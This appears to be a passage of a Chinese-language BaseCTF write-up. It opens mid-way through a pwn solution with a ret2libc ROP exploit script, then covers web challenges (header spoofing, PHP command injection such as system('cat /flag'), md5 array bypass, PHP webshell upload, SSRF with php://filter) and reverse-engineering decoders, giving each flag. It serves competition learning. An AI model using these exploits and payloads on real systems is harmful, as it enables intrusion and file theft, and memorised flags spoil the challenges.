pay=b'a'*18+p64(0x401196) +p64(0x404018)+p64(0x401070) +p64(0x401214)
p.recvuntil(b'name?\n')
p.send(pay)
addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) - 0x80e50
print(hex(addr))
pay = b'a'*18+p64(0x401196) +p64(addr+0x1d8678)+p64(0x401197)+p64(addr+0x50d70) +p64(0x401214)
p.send(pay)
p.interactive()
```

## Web
### HTTP 是什么呀
![](../../../../images/6d4b156620ea3f39f9792af91138688a.png)

听话照做即可，注意 GET 中参数 basectf 的值需要经过 url 编码后再传入。

```plain
?basectf=%77%65%31%63%25%30%30%6d%65

Base= fl@g  

Cookie: c00k13=i can't eat it  

User-Agent: Base  

Referer: Base

X-Forwarded-For: 127.0.0.1

```

![](../../../../images/e488c8ff06a2eb890171a20daf05f362.png)

完成任务后跳转到了另一个页面，抓包看一下有没有什么东西，可以看到 Base64 Encode 后的一个字符串，Decode 后可以得到 flag。

```plain
QmFzZUNURnthZjJiMTA1MS01NjdiLTQ5MjctODBiNi00ZjE4MmU5MDQzODF9Cg==

```

```plain
BaseCTF{af2b1051-567b-4927-80b6-4f182e904381}

```



### 喵喵喵´•ﻌ•`
![](../../../../images/15e2379db99250c9f657ac3cedba8d8c.png)

裸的命令执行。

```plain
?DT=system('ls /');      

[+]查看根目录下所有文件，找到一个名为 flag 的文件

```

```plain
?DT=system('cat /flag');

[+]获取 flag 文件内容，得到 flag

```

```plain
BaseCTF{7edb9947-66f6-4f00-91e2-b2e9a4f7d3a8}  

```



### md5绕过欸
![](../../../../images/cfb57c9145e83135863f3edb4a6f8f91.png)

经典的 md5 绕过，全部使用数组绕过即可。

```plain
GET: ?name[]=1&name2[]=1

Post: password[]=2&password2[]=2

```

```plain
 BaseCTF{110ab0c6-c3ed-4b01-99cf-38ac79db74cf}  

```



### A Dark Room
![](../../../../images/5c0665118912ce6d5be12c03194788b6.png)

好玩的小黑屋，但是没时间玩，直接 Ctrl + U 查看源代码。

![](../../../../images/0af0fd8ae7f9b076e98f150712588918.png)

拖到最下方发现 flag。

```plain
BaseCTF{c2f87edd-fe6c-4952-b5ac-f9b71ff0da9f}

```



### upload
![](../../../../images/a2035ab6edbabff3bb83af8fdce04466.png)

文件上传，先直接上传 php 文件看看能不能成功。

![](../../../../images/280c6d2393d673f7a8cddbf49fb38888.png)

直接就上传进去了，目录也非常容易知道，直接右键图片复制图像链接即可。

```plain
上传的文件目录: [http://xxxxxxx/uploads/a.php](http://challenge.basectf.fun:24089/uploads/a.php)

```

 使用蚁剑链接，可以在根目录下找到 flag。

```plain
BaseCTF{24815e89-d0a9-4932-aa8b-c34fff10c76b}

```



### Aura 酱的礼物
考察 php 伪协议和 SSRF。

![](../../../../images/b8a2c49257a34d1b6604f03f0196c431.png)

一共三层，逐个分析。

```plain
POST: pen=data://plain/text,Aura

[+] 使用 data 伪协议，这样读出的字符串就是 Aura

```

```plain
POST: challenge=[http://jasmineaura.github.io](http://jasmineaura.github.io)

[+] 检测目标字符串是否在 challenge 的开头，按要求传入即可

```

```plain
POST: challenge=[http://jasmineaura.github.io](http://jasmineaura.github.io)@127.0.0.1

[+] 第二层限制我们 challenge 的开头只能是 [http://jasmineaura.github.io](http://jasmineaura.github.io)，不过 file_get_contents 可以用于发起 HTTP 请求，获取远程资源的内容。

[+] 如何让页面内容包含指定的字符串呢？这里需要用到@。@ 是虚拟域名,  在浏览器输入后, 浏览器会识别@后面的域名, 前面则是域名的配置信息。

[+] 在 challenge 尾部加上 @127.0.0.1，这样 file_get_contents 获取的内容就是当前页面的内容，正好包含了目标字符串。

```

最后提示到 flag 在 flag.php 中，使用 php://filter 伪协议读出 flag 即可。

```plain
POST: gift=php://filter/read=convert.base64-encode/resource=flag.php

```

```plain
POST: pen=data://plain/text,Aura&challenge=[http://jasmineaura.github.io](http://jasmineaura.github.io)@127.0.0.1&gift=php://filter/read=convert.base64-encode/resource=flag.php

```

```plain
PD9waHAgLy8gZmxhZ3tlNDBiNzEyNy1mMjU4LTQyMGQtOTc1MC0zZGM5NGFjYTllZWJ9ICBBdXJhIOmFseacieaLv+WIsOS4gOihgOWQl++8nwo=  

```

Base64 Decode 得到 flag。

```plain
flag{e40b7127-f258-420d-9750-3dc94aca9eeb}

```



## Reverse
### You are good at IDA
拖入 DIE，无壳，64位，丢入 IDA。

![](../../../../images/f62283c2837baee98a638475ab6c42e1.png)

main 函数中发现 flag 第一部分。

```plain
Y0u_4Re_

```

![](../../../../images/76443327d218f2deb2b2cf0f96aebdd4.png)

F12 查看字符串，发现第二部分，并且得到提示，最后一部分在函数 Interesting 中。

```plain
900d_47_

```

![](../../../../images/c613bbb19952034c261f8a54b280b824.png)

进入该函数，发现最后一部分。

```plain
BaseCTF{Y0u_4Re_900d_47_id4}

```



### UPX mini
拖入 DIE，UPX 壳，64位。

使用 upx.exe 脱壳。

:::warning
upx -d UPX mini.exe

:::

脱壳以后丢入 IDA。

![](../../../../images/a171eb17b44fd4e0fa1935875055b7cd.png)

直接 Base64 解码得到 flag。

```plain
BaseCTF{Hav3_@_g0od_t1m3!!!}

```



### Ez Xor
拖入 DIE，无壳，64位，丢入 IDA。

![](../../../../images/6e7abfe3da229aef64fbfba4c7110b25.png)

大致流程就是生成了一个密钥 v14，然后对 v5 进行加密，跟进一下两个函数。

![](../../../../images/509265e3857e6ab7bb71104b8a8f1021.png)

![](../../../../images/90366b7bf40cbff31d7ecaabca90bbbd.png)

生成的密钥 v14 可以直接动调取出来，至于如何解密 Str，按照逻辑异或回去即可。

```cpp
#include <bits/stdc++.h>
using namespace std;
char enc[] =
{
    1,   9,   5,  37,  38,  45,  11,  29,  36, 122, 
   49,  32,  30,  73,  61, 103,  77,  80,   8,  37, 
   46, 110,   5,  52,  34,  64,  59,  37
};
unsigned char key[] =
{
   88, 110, 112,  91, 107, 119,  94, 104, 122,  81, 
  101, 121,  84,  98, 124,  87, 127,  99,  74, 124, 
  102,  77, 121, 101,  64, 118, 104,  67
};
int main()
{
    for(int i=0;i<28;i++)
    {
        int temp = enc[i]^key[28-i-1];
        cout<<char(temp);
    }
	return 0;
}
//BaseCTF{X0R_I5_345Y_F0r_y0U}
```



### ez_maze
拖入 DIE，无壳，64位，丢入 IDA。

很明显的迷宫题，观察代码，上下左右分别对应 wsad。

F12 找一下迷宫地图，发现长度为 225，说明是一个 15*15 规格的迷宫。

这里为了方便走，把墙替换成了 1，空地替换成了 0。

```plain
x11111111111111

000000111111111

010110110000011

010111001111011

011100011111011

011101001011111

011101011000111

000001000010111

111111000000111

111111011111111

111000011000111

111000000011111

111111111011011

111111111010111

11111100000000y

```

x 是起点，y 是终点，手动走一下可以得到路线。

```plain
sssssssddddwwwddsssssssdddsssddddd

```

![](../../../../images/14e2974766124f5802a2b11e1c67fffb.png)

注意最后的 flag 是路线的 md5 值。

```plain
BaseCTF{131b7d6e60e8a34cb01801ae8de07efe}

```



### BasePlus
拖入 DIE，无壳，64位，丢入 IDA。

![](../../../../images/6c0c58ad2a5f49960be669cf69088d05.png)

大致流程就是读入一个 v5，加密以后变为 Str1，之后将 Str1 与密文对比。

跟进 Encode 函数看一下加密过程。

上面是一个换表的 Base64，下面有一个异或14加密的过程。

![](../../../../images/8dfa19668ecf334c52539b3effb5b325.png)

那么思路也很简单，先把密文异或回去，再进行 Base64 Decode 即可。

```python
enc = "lvfzBiZiOw7<lhF8dDOfEbmI]i@bdcZfEc^z>aD!"
b64 = ""
for i in enc:
    b64 += chr(ord(i)^14)
print(b64)
#bxhtLgTgAy92bfH6jJAhKlcGSgNljmThKmPt0oJ/
```

丢入 CyberChef 进行最后的 Base64 Decode ，注意这里的表是 Atom128 加密后的标准表，换表解密得到 flag。（不过 CyberChef 能够识别出来正确的表）

```plain
BaseCTF{BA5e_DEcoD1N6_sEcr3t}

```

